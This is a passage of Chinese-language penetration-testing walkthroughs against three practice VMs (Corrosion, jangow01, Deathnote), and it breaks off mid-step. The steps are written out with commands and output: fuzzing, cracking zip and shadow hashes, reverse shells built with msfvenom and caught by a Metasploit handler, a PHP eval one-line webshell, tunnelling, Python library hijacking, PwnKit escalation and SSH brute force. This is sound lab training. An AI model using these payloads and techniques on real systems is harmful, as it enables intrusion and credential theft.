注：存在两个网站，通过浏览器访问，未发现有用的信息。



尝试使用 FFUF 扫描 80 端口的网页

```
ffuf -u http://10.10.10.103/indexFUZZ -w web-extensions-big.txt

.html                   [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 5ms]
.html                   [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 2ms]
:: Progress: [66886/66886] :: Job [1/1] :: 18181 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

```
ffuf -u http://10.10.10.103/FUZZ -w raft-medium-files-lowercase.txt

index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 2ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.                       [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 1ms]
.html                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htm                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.htpasswds              [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.htgroup                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htaccess.bak           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.htuser                 [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.ht                     [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htc                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
:: Progress: [16244/16244] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

注：没有发现任何有用的信息。以 . 开头的 .xxx 403 信息是误报。



尝试使用 FFUF 扫描 8080 端口的网页

```
ffuf -u http://10.10.10.103:8080/indexFUZZ -w web-extensions-big.txt
.jsp                    [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 37ms]
.jsp                    [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 14ms]
:: Progress: [66886/66886] :: Job [1/1] :: 13333 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

```
ffuf -u http://10.10.10.103:8080/FUZZ -w raft-large-files-lowercase.txt

favicon.ico             [Status: 200, Size: 21630, Words: 19, Lines: 22, Duration: 22ms]
.                       [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 6ms]
index.jsp               [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 3ms]
readme.txt              [Status: 200, Size: 153, Words: 28, Lines: 3, Duration: 7ms]
backup.zip              [Status: 200, Size: 33723, Words: 146, Lines: 121, Duration: 7ms]
:: Progress: [35325/35325] :: Job [1/1] :: 12500 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

发现 backup.zip 文件，可能是管理员在备份时忽视大意忘记删除了，通过 HTTP 服务暴露出来了。



使用 words 字典配合 .jsp,.zip,.txt 进行扫描。

```
ffuf -u http://10.10.10.103:8080/FUZZ -w raft-medium-words-lowercase.txt -e .jsp,.zip,.txt

index.jsp               [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 5ms]
docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
backup.zip              [Status: 200, Size: 33723, Words: 146, Lines: 121, Duration: 4ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
.                       [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 3ms]
readme.txt              [Status: 200, Size: 153, Words: 28, Lines: 3, Duration: 1ms]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
:: Progress: [225172/225172] :: Job [1/1] :: 1818 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
```



端口扫描时发现 8080 是 tomcat 服务器，manager 是 tomcat 服务器的 web 管理页面。

访问页面需要提供账号密码。

![image-20250302162514632](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302162514632.png)



下载压缩包，看看其中是否存在可用信息。

```
root@xiaoshae:/opt# wget http://10.10.10.103:8080/backup.zip
--2025-03-02 18:30:07--  http://10.10.10.103:8080/backup.zip
Connecting to 10.10.10.103:8080... connected.
HTTP request sent, awaiting response... 200 
Length: 33723 (33K) [application/zip]
Saving to: ‘backup.zip’

backup.zip                               100%[===============================================================================>]  32.93K  --.-KB/s    in 0s      

2025-03-02 18:30:07 (892 MB/s) - ‘backup.zip’ saved [33723/33723]
```



尝试解压，发现需要账号密码

```
unzip backup.zip 
Archive:  backup.zip
[backup.zip] catalina.policy password: root
```



使用 zip2john 提取 hash 

```
zip2john backup.zip > hash 

ver 2.0 efh 5455 efh 7875 backup.zip/catalina.policy PKZIP Encr: TS_chk, cmplen=2911, decmplen=13052, crc=AD0C6FDB ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/context.xml PKZIP Encr: TS_chk, cmplen=721, decmplen=1400, crc=59B9F4E7 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/catalina.properties PKZIP Encr: TS_chk, cmplen=2210, decmplen=7276, crc=1CD3C095 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/jaspic-providers.xml PKZIP Encr: TS_chk, cmplen=626, decmplen=1149, crc=748A87A6 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/jaspic-providers.xsd PKZIP Encr: TS_chk, cmplen=862, decmplen=2313, crc=3B44D150 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/logging.properties PKZIP Encr: TS_chk, cmplen=1076, decmplen=4144, crc=1D6C26F7 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/server.xml PKZIP Encr: TS_chk, cmplen=2609, decmplen=7589, crc=F91AC0C0 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/tomcat-users.xml PKZIP Encr: TS_chk, cmplen=1167, decmplen=2972, crc=BDCB08B9 ts=B0E3 cs=b0e3 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/tomcat-users.xsd PKZIP Encr: TS_chk, cmplen=858, decmplen=2558, crc=E8F588C2 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/web.xml PKZIP Encr: TS_chk, cmplen=18917, decmplen=172359, crc=B8AF6070 ts=6920 cs=6920 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```



尝试爆破密码

```
john --wordlist=rockyou.txt hash 

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Note: Passwords longer than 21 [worst case UTF-8] to 63 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
@administrator_hi5 (backup.zip)     
1g 0:00:00:01 DONE (2025-03-02 18:32) 0.9901g/s 11387Kp/s 11387Kc/s 11387KC/s @lexus1s..9Spruce
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

密码为：@administrator_hi5



解压压缩包

```
unzip backup.zip

Archive:  backup.zip
[backup.zip] catalina.policy password: 
  inflating: catalina.policy         
  inflating: context.xml             
  inflating: catalina.properties     
  inflating: jaspic-providers.xml    
  inflating: jaspic-providers.xsd    
  inflating: logging.properties      
  inflating: server.xml              
  inflating: tomcat-users.xml        
  inflating: tomcat-users.xsd        
  inflating: web.xml
```



查找文件信息，在 tomcat-users.xml 文件中发现 tomcat manager 的密码为 **melehifokivai**。

![image-20250302183425398](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302183425398.png)



成功登录 manager 页面，发现可以部署 war 应用程序

![image-20250302183621629](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302183621629.png)



使用 msfvenom 生成适用于 war 的反向 shell

```
msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=8080 -f war -o shell.war

Payload size: 6210 bytes
Final size of war file: 6210 bytes
Saved as: shell.war
```



使用 msfconsole 监听

```
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set PAYLOAD java/meterpreter/reverse_tcp 
PAYLOAD => java/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 10.10.10.10
LHOST => 10.10.10.10

msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.10.10:8080 
```



在 manager 中部署 shell.war 应用程序

![image-20250302184036642](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302184036642.png)



部署成功后访问页面（页面为空是正常情况）

![image-20250302184059909](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302184059909.png)

![image-20250302184118563](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302184118563.png)



反向 shell 连接成功

```
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.10.10:8080 
[*] Sending stage (58073 bytes) to 10.10.10.103
[*] Meterpreter session 1 opened (10.10.10.10:8080 -> 10.10.10.103:58936) at 2025-03-02 10:41:02 +0000

meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > 
```



提升会话

```
msf6 exploit(multi/handler) > sessions -u 1 
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_railgun_api, stdapi_sys_process_kill
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.10.10:4433 
[*] Command stager progress: 100.00% (773/773 bytes)

[*] Sending stage (1017704 bytes) to 10.10.10.103
msf6 exploit(multi/handler) > [*] Meterpreter session 2 opened (10.10.10.10:4433 -> 10.10.10.103:34140) at 2025-03-02 10:42:20 +0000
[*] Stopping exploit/multi/handler

msf6 exploit(multi/handler) > 
```



通过 Meterpreter 收集信息

```
msf6 exploit(multi/handler) > sessions -i 2 
[*] Starting interaction with 2...

meterpreter > sysinfo 
Computer     : 10.10.10.103
OS           : Ubuntu 20.04 (Linux 5.11.0-34-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > 
```



在 /home 路径下存在两个用户

```
tomcat@corrosion:/home$ ls
jaye
randy
```



尝试撞库攻击，使用 manager 的密码（**melehifokivai**），去 ssh 登录这两个用户，发现 jaye 用户密码和 manager 密码一致。

登录 jaye 账户后发现其存在一个 **SUID 和 SGID** 的可执行文件。

- 当用户执行该文件时，进程的 **有效用户 ID** 会临时变为文件所有者（`root`）。
- 进程的 **有效组 ID** 会临时变为文件所属组（`root`）。

```
jaye@corrosion:~/Files$ file look
look: setuid, setgid executable, regular file, no read permission
```



`look` 是一个命令行工具，通常用于在 **已排序的文件** 中查找以特定字符串开头的行。它的行为类似于简化的 `grep`，但专为快速查找前缀设计。

- `[-bdf]`：可选参数（选项）：
    - `-b`：在查找时忽略字符串前的空白（如空格、制表符）。
    - `-d`：仅比较字母、数字和空格（忽略其他字符，如标点符号）。
    - `-f`：忽略大小写（如将 "A" 和 "a" 视为相同）。
- `[-t char]`：指定终止符（`char` 是一个字符），仅匹配到该字符前的字符串。
- `string`：要查找的 **前缀字符串**（必需参数）。
- `[file ...]`：要搜索的文件列表（可选参数，默认可能使用系统字典文件）。



当普通用户 jaye 执行 look 命令是，look 命令会以 root 权限运行，使用 look 读取 /etc/shadow 文件

```
jaye@corrosion:~/Files$ ./look '' /etc/shadow 
root:$6$fHvHhNo5DWsYxgt0$.3upyGTbu9RjpoCkHfW.1F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK.5OR57.:18888:0:99999:7:::
...
randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::
...
tomcat:$6$XD2Bs.tL01.5OT2b$.uXUR3ysfujHGaz1YKj1l9XUOMhHcKDPXYLTexsWbDWqIO9ML40CQZPI04ebbYzVNBFmgv3Mpd3.8znPfrBNC1:18888:0:99999:7:::
...
jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/szqkiI1kerC4/JJNMpDUYKavQbnZeUh4WL/fB/4vrzX0LvKVWu60dq4SOQZB0:18887:0:99999:7:::
```



使用 john 成功爆破 randy 密码

```
john — wordlist=/usr/share/wordlists/rockyou.txt hash.txt
...
07051986randy
```



切换到 randy 用户

```
jaye@corrosion:/home/randy$ su randy 
Password: 
randy@corrosion:~$ 
```



查看 randy 的 sudo 权限，输出显示 Randy 可以使用提升的权限运行 Python 脚本。

```
randy@corrosion:~$ sudo -l 
[sudo] password for randy: 
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```



randombase64.py 仅 root 用户可以修改，查看这个 python 脚本发现其导入一个 base64 库文件。

```
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
randy@corrosion:~$ file randombase64.py 
randombase64.py: ASCII text
```



基础的 Python 库劫持有 **PYTHONPATH环境变量、直接修改库文件（具有写权限）**。

因为 sudo 命令的安全设置，**会重置环境变量**，且无法设置环境变量，所以不存在**PYTHONPATH环境变量**。

```
randy@corrosion:/tmp/test$ sudo PYTHONPATH=/tmp/test/ /usr/bin/python3.8 /home/randy/randombase64.py 

sudo: sorry, you are not allowed to set the following environment variables: PYTHONPATH
```



查看 Python 搜索库的路径

```
>>> import sys
>>> print("\n".join(sys.path))

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```



在系统上查找所有 base64.py 文件

```
locate base64.py

/home/randy/randombase64.py
/snap/core18/2128/usr/lib/python3.6/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python2.7/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python3.6/base64.py
/usr/lib/python3.8/base64.py
```



查看文件的权限（具有写入权限）

```
-rwxrwxrwx 1 root root 20420 Mar  2 16:52 /usr/lib/python3.8/base64.py
```



修改 base64.py 文件

![image-20250303085207798](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250303085207798.png)



sudo 执行脚本，获得 root 权限。

```
sudo /usr/bin/python3.8 /home/randy/randombase64.py 

[sudo] password for randy: 
root@corrosion:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```



### jangow01



Nmap 扫描 IP 地址

```
nmap -sP -PR -n -T 5 10.10.10.0/24

...
MAC Address: 00:50:56:C0:00:0A (VMware)
Nmap scan report for 10.10.10.100
```



Nmap 扫描 TCP 端口，发现一个 HTTP 站点和 VSFTPD 站点。

```
db_nmap -sV -n -p- -r -T 5 -O 10.10.10.100

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.100  21    tcp    ftp   open   vsftpd 3.0.3
10.10.10.100  80    tcp    http  open   Apache httpd 2.4.18
```



使用 ffuf 高频文件字典爆破网站路径，发现 .backup 文件。

```
ffuf -u http://10.10.10.100/FUZZ -w raft-large-files-lowercase.txt

...
.backup                 [Status: 200, Size: 336, Words: 30, Lines: 13, Duration: 10ms]
...
:: Progress: [35325/35325] :: Job [1/1] :: 74 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```



使用 wget 下载 .backup 文件，发现里面为连接数据库的账号和密码。

```
wget http://10.10.10.100/.backup -O backup

# 文件内容
$servername = "localhost";
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);
```



尝试使用改账号密码登录 ftp 服务器，登录成功，可能是系统用户。

![image-20250304140204604](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304140204604.png)



使用浏览器访问网站，发现一个参数可以执行命令，以下是发现过程：

![image-20250304140413616](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304140413616.png)

![image-20250304140500353](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304140500353.png)

![image-20250304140522856](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304140522856.png)

![image-20250304140534450](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304140534450.png)



对一句话木马进行 base64 编码

```
<?php eval($_POST['CMD']); ?>
```

```
PD9waHAgZXZhbCgkX1BPU1RbJ0NNRCddKTsgPz4=
```



使用 yakit 上传一句话木马

![image-20250304140840730](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304140840730.png)



使用中国蚁剑连接成功

![image-20250304141035051](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304141035051.png)



简单测试发现靶机对入站和出站流量做了限制

![image-20250304141208731](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304141208731.png)



使用 netstat -tunpl 发现靶机中开启了 ssh 服务，监听了 22 端口，但是配置了防火墙禁止 22 端口入站。

![image-20250304163418690](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304163418690.png)



使用 Neo-reGeorg 生成 php 文件，上传到网站中。

```
neoreg generate -k 123

    [+] Create neoreg server files:
       => neoreg_servers/tunnel.cs
       => neoreg_servers/tunnel.go
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.php
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel.jspx
```

![image-20250304162410860](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304162410860.png)



使用 Neo-reGeorg 将本地 2222 端口转发到远程主机 22 端口。

```
neoreg -k 123 -u http://10.10.10.100/site/tunnel.php --php --read-interval 1 --write-interval 1 -l 0.0.0.0 -p 2222 -t 127.0.0.1:22

+------------------------------------------------------------------------+
  Log Level set to [ERROR]
  Starting Forward [0.0.0.0:2222] => [127.0.0.1:22]
  Tunnel at:
    http://10.10.10.100/site/tunnel.php
+------------------------------------------------------------------------+
```



使用泄露的账号密码，通过 127.0.0.1:2222 进行 ssh 登录。

```
ssh jangow01@127.0.0.1 -p 2222

jangow01@127.0.0.1's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)
...
jangow01@jangow01:~$ 
```



如果想要 msfconsole 接管系统，必须在远程端口转发，将靶机的流量转发到攻击机。

Neo-reGeorg 可以很好的进行本地端口转发，但不太适合进行远程端口转发，不过当前已经可以连接到靶机的 ssh 服务，可以使用 ssh 自带的远程端口转发。

```
ssh jangow01@127.0.0.1 -p 2222 -R 4444:127.0.0.1:4444 -R 5555:127.0.0.1:5555 -Nf
```



在靶机上执行 netstat -tunpl 命令，发现已经监听 4444 和 5555 端口。

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name	
tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN       -               
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN       -               
```



在本机 nc -l -p 4444 监听端口，靶机连接 nc 127.0.0.1 4444 端口，数据转发成功。

```
jangow01@jangow01:~$ nc 127.0.0.1 4444
hello

root@localhost:~# nc -l -p 4444
hello
```



msfconsole 生成 payload 文件（LHOST 127.0.0.1 LPORT 4444），上传到靶机。

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o elf 

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: elf
```

![image-20250304181254293](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304181254293.png)



msfconsole 监听端口

```
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp 
PAYLOAD => linux/x64/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 127.0.0.1 
LHOST => 127.0.0.1

msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444

msf6 exploit(multi/handler) > run
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444 
```



在靶机上设置 elf 可执行权限，并执行。

![image-20250304181740428](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250304181740428.png)



msfconsole 成功上线

```
[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] Sending stage (3045380 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:40612) at 2025-03-04 10:16:55 +0000

meterpreter > sysinfo 
Computer     : 10.10.10.100
OS           : Ubuntu 16.04 (Linux 4.4.0-31-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > 
```



使用 post/multi/recon/local_exploit_suggester 扫描本地提权漏洞

```
meterpreter > run post/multi/recon/local_exploit_suggester
[*] 127.0.0.1 - Collecting local exploits for x64/linux...
[*] 127.0.0.1 - 203 exploit checks are being tried...
[+] 127.0.0.1 - exploit/linux/local/bpf_sign_extension_priv_esc: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/cve_2021_3493_overlayfs: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.
[+] 127.0.0.1 - exploit/linux/local/cve_2022_0995_watch_queue: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/docker_cgroup_escape: The target is vulnerable. IF host OS is Ubuntu, kernel version 4.4.0-31-generic is vulnerable
[+] 127.0.0.1 - exploit/linux/local/glibc_realpath_priv_esc: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/ntfs3g_priv_esc: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/pkexec: The service is running, but could not be validated.
[+] 127.0.0.1 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/su_login: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/sudoedit_bypass_priv_esc: The target appears to be vulnerable. Sudo 1.8.16.pre.0ubuntu1.1 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module
[*] Running check method for exploit 73 / 73
[*] 127.0.0.1 - Valid modules for session 1:
============================

 #   Name                                                                Potentially Vulnerable?  Check Result
 -   ----                                                                -----------------------  ------------
 1   exploit/linux/local/bpf_sign_extension_priv_esc                     Yes                      The target appears to be vulnerable.
 2   exploit/linux/local/cve_2021_3493_overlayfs                         Yes                      The target appears to be vulnerable.
 3   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                 Yes                      The target is vulnerable.
 4   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
 5   exploit/linux/local/docker_cgroup_escape                            Yes                      The target is vulnerable. IF host OS is Ubuntu, kernel version 4.4.0-31-generic is vulnerable
 6   exploit/linux/local/glibc_realpath_priv_esc                         Yes                      The target appears to be vulnerable.
 7   exploit/linux/local/ntfs3g_priv_esc                                 Yes                      The target appears to be vulnerable.
 8   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.
 9   exploit/linux/local/ptrace_traceme_pkexec_helper                    Yes                      The target appears to be vulnerable.
 10  exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
 11  exploit/linux/local/sudoedit_bypass_priv_esc                        Yes                      The target appears to be vulnerable. Sudo 1.8.16.pre.0ubuntu1.1 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module
...
```



逐个尝试扫描到的漏洞，成功提升权限到 root

```
msf6 exploit(multi/handler) > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set SESSION 1 
SESSION => 1

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LHOST 127.0.0.1 
LHOST => 127.0.0.1

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LPORT 5555
LPORT => 5555

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > run 
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] Verify cleanup of /tmp/.qhwyrca
[+] The target is vulnerable.
[*] Writing '/tmp/.wefuymefljbi/kfqdwzcdv/kfqdwzcdv.so' (540 bytes) ...
[!] Verify cleanup of /tmp/.wefuymefljbi
[*] Sending stage (3045380 bytes) to 127.0.0.1
[+] Deleted /tmp/.wefuymefljbi/kfqdwzcdv/kfqdwzcdv.so
[+] Deleted /tmp/.wefuymefljbi/.oniqfxz
[+] Deleted /tmp/.wefuymefljbi
[*] Meterpreter session 2 opened (127.0.0.1:5555 -> 127.0.0.1:54186) at 2025-03-04 10:22:28 +0000

meterpreter > shell
Process 4624 created.
Channel 1 created.
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```



### Deathnote

Nmap 扫描 IP

```
nmap -sP -PR -n -T 5 10.10.10.0/24

address       mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----  -------  ---------  -----  -------  ----  --------
10.10.10.101  00:0c:29:77:aa:a8        Linux               4.X    server
```



Nmap 扫描 TCP 服务

```
db_nmap -sS -sV -n -p- -r -O -T 5 10.10.10.101

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.101  22    tcp    ssh   open   OpenSSH 7.9p1 Debian 10+deb10u2 protocol 2.0
10.10.10.101  80    tcp    http  open   Apache httpd 2.4.38 (Debian)
```



FFUF 工具使用高频文件字典进行扫描，发现 robots.txt 文件

```
ffuf -u http://10.10.10.101/FUZZ -w raft-large-files-lowercase.txt

robots.txt              [Status: 200, Size: 68, Words: 11, Lines: 5, Duration: 1ms]
```



访问 robots.txt 页面，提示 /important.jpg 路径

```
curl http://10.10.10.101/robots.txt
fuck it my dad 
added hint on /important.jpg

ryuk please delete it
```



访问 important.jpg 页面，其是一个 ASCII 文本文件

```
i am Soichiro Yagami, light's father
i have a doubt if L is true about the assumption that light is kira

i can only help you by giving something important

login username : user.txt
i don't know the password.
find it by yourself 
but i think it is in the hint section of site
```

提示用户名存放在 **user.txt** 中



FFUF 工具使用目录字典进行扫描

```
ffuf -u http://10.10.10.101/FUZZ -w raft-medium-directories-lowercase.txt

wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 0ms]
manual                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms]
```



访问 manual 页面，这是 apache 的文档，无内容。

访问 wordpress 页面，发现该网站是 wordpress CMS，后端是 apache + php。

注：这里将 10.10.10.101 和域名 deathnote.vuln 绑定，通过域名访问网站，否则会出现问题。

![image-20250305095616725](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250305095616725.png)



查看网页元素发现 upload 路径

![image-20250305094305755](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250305094305755.png)



尝试在靶机上访问该路径，发现该路径存在，开启了 apache 的目录浏览模式，存在 user.txt 和 notes.txt

![image-20250305095811866](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250305095811866.png)



根据 user.txt 和 notes.txt 猜测可能是账号和密码表。

```
user.txt

KIRA
L
ryuk
...
```

```
notes.txt

death4
death4life
death4u
...
```



尝试进行 ssh 登录

```
msf6 > use auxiliary/scanner/ssh/ssh_login 

msf6 auxiliary(scanner/ssh/ssh_login) > hosts -R 
RHOSTS => 10.10.10.101

msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE user.txt 
USER_FILE => user.txt

msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE notes.txt
PASS_FILE => notes.txt

msf6 auxiliary(scanner/ssh/ssh_login) > run 
[*] 10.10.10.101:22 - Starting bruteforce

[+] 10.10.10.101:22 - Success: 'l:death4me' 'uid=1000(l) gid=1000(l) groups=1000(l),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth) Linux deathnote 4.19.0-17-amd64 #1 SMP Debian 4.19.194-2 (2021-06-21) x86_64 GNU/Linux '
[*] SSH session 1 opened (10.10.10.10:36185 -> 10.10.10.101:22) at 2025-03-05 02:12:59 +0000
uname -a 
Linux deathnote 4.19.0-17-amd64 #1 SMP Debian 4.19.194-2 (2021-06-21) x86_64 GNU/Linux
```



查找主机上的文件，/home/l/user.txt 文件内容为 Brainfuck 编码

```
